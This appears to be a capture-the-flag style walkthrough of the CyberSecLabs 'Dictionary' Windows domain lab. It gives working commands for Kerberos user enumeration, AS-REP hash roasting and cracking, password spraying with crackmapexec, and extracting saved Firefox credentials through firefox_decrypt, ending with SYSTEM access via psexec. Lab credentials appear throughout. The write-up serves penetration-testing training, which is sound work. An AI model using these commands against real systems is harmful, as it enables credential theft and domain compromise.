---
description: https://www.cyberseclabs.co.uk/labs/info/Dictionary/
---

# Dictionary

![](<../../../.gitbook/assets/image (578) (1).png>)

## Nmap

```
sudo nmap 172.31.3.4 -p- -sS

PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49668/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49681/tcp open  unknown
49697/tcp open  unknown
49703/tcp open  unknown
49742/tcp open  unknown
49913/tcp open  unknown
```

## SMB

Starting off with the usual checks against SMB leads us to no access with `smbclient` and `crackmapexec`.

![](<../../../.gitbook/assets/image (579).png>)

I also attempted a null login with `rpcclient` on RPC and was unable to authenticate.

## LDAP

Authenticating against LDAP with no credentials does not reveal any sensitive information. We do get the naming context however.

```
nmap -n -sV --script "ldap* and not brute" 172.31.3.4
```

![](<../../../.gitbook/assets/image (580).png>)

## Kerberos

With no web server up and some of the most common ports quickly scanned over we can check Kerberos with `Kerbrute` for any existing accounts.

```
./kerbrute userenum /usr/share/seclists/Usernames/Names/names.txt --dc 172.31.3.4 -d dictionary.csl
```

![](<../../../.gitbook/assets/image (581).png>)

We should now run this name against Impacket's GetNPUsers.py script to check if the account 'izabel' is Kerberoastable.

```
sudo python2 GetNPUsers.py -request -format john -dc-ip 172.31.3.4 dictionary/izabel -no-pass
```

After this command has been run you should receive a hash back. Place this hash into a file and then run John to crack the password.

```
sudo john --wordlist=/usr/share/wordlists/rockyou.txt /home/kali/Desktop/hash 
```

![](<../../../.gitbook/assets/image (582).png>)

We now have the credentials of izabel:June2013. I then cried connecting in with `Evil-WinRM` since port 5985 is open but was denied access.

![](<../../../.gitbook/assets/image (583).png>)

I then tried with `rpcclient` and was given access. From here I was able to enumerate domain users with the `enumdomusers` command.

![](<../../../.gitbook/assets/image (584) (1).png>)

We can take these users and put them in a text file. As we already have a valid login for Izabel I will only add the following three accounts to a file.

* Valencia
* Backup-Izabel
* Administrator

We can test these against SMB and `WinRM` with `crackmapexec` using the password 'June2013' if we are lucky we might get a hit.

![](<../../../.gitbook/assets/image (585) (1).png>)

No valid hits was returned from `crackmapexec`. Its important to note that because we have the password 'June2013' its possible users are using predictable patterns for passwords. Ideally we can create a wordlist of months and years.

`Hashcat` which comes pre-installed on Kali has a tool called Combinator.bin that can take two separate text files and combine the words within to create a custom wordlist.

First we need to create a text file containing months and another containing years.

![](<../../../.gitbook/assets/image (586).png>)

Use the command locate to find the location of your combinator.bin file. Once in the directory run the file with the following syntax.

```
./combinator.bin <file1> <file2>
```

This will create a list that should like the following below. Save this output to a file.

![](<../../../.gitbook/assets/image (587).png>)

We can now run this against `crackmapexec`.

```
crackmapexec winrm 172.31.3.4 -u <userlist> -p <passlist>
```

After a short while we get a match under WinRM.

![](<../../../.gitbook/assets/image (588).png>)

We can then log in with Evil-WinRM.

```
evil-winrm -u backup-izabel -p October2019 -i 172.31.3.4
```

![](<../../../.gitbook/assets/image (589).png>)

Running the command `whoami /all` does not show anything outstanding.

![](<../../../.gitbook/assets/image (590).png>)

Access to `systeminfo` is blocked by the system. As per usual I will run winPEAS.exe to help identify any privilege escalation vectors. I was able to upload the binary with the `upload` command then execute as shown below.

![](<../../../.gitbook/assets/image (591).png>)

`winPEAS` did not show too much interesting information however, we do appear to have Firefox installed which as we know is not default on Windows and warrants a closer look.

![](<../../../.gitbook/assets/image (592).png>)

We can check what version of Firefox is running by calling the Firefox binary with the -`v` switch.

![](<../../../.gitbook/assets/image (593).png>)

I run this against `searchsploit` and did not have any relevant results. A Google search also gave no major exploits for this revision of Firefox.

![](<../../../.gitbook/assets/image (594) (1).png>)

What we can do is check for stored passwords. Its always worth checking appdata for stored browser credentials when possible.

A Google search regarding saved passwords location for Firefox takes us to a user submitted query on Mozilla's website.

![](<../../../.gitbook/assets/image (595) (1).png>)

Heading over to the effective same location on the Server we see two profiles stored.

![](<../../../.gitbook/assets/image (596) (1).png>)

Moving into the 65wr35iv.default-release profile we see two of the interesting files mentioned on the Mozilla website.

![](<../../../.gitbook/assets/image (597).png>)

We can download the profile folder with the `download` command to further inspect it.

```
download C:\users\backup-izabel\appdata\roaming\mozilla\Firefox\Profiles\65wr35iv.default-release
```

{% hint style="info" %}
Be patient whilst the folder downloads. This took a few minutes to downloaded for myself.
{% endhint %}

When attempting to view the logins.json file we get encrypted values.

![](<../../../.gitbook/assets/image (598).png>)

If we turn to Google and search for ways to decrypt the logins.json values the top results is a Python script by unode called 'firefox\_decrypt.

{% embed url="https://github.com/unode/firefox_decrypt" %}

We can use `Git Clone` command to download to our machine.

```
sudo git clone https://github.com/unode/firefox_decrypt.git
```

Then as per the above GitHub page we can called the python script and specify the location of the profile folder to attempt to decrypt and extract credential information. When asked for a master password just hit enter to skip password input.

![](<../../../.gitbook/assets/image (600).png>)

Now that we have further credential information it will be worth us adding these to our exists username and password lists we created earlier.

```
crackmapexec winrm 172.31.3.4 -u <userfile> -p <passlist> --continue-on-success
```

We can now try spraying these with crackmapexec against WinRM with our list of known users to see if we get a valid hit.

![](<../../../.gitbook/assets/image (602) (1).png>)

We are then able to login with Evil-WinRM.

![](<../../../.gitbook/assets/image (603) (1).png>)

We are now the Domain Administrator. Lets see if we can use Impacket's psexec.py to elevate to SYSTEM.

```
sudo python2 psexec.py dictionary/administrator:kC7pbrQAsTT@172.31.3.4
```

![](<../../../.gitbook/assets/image (604).png>)
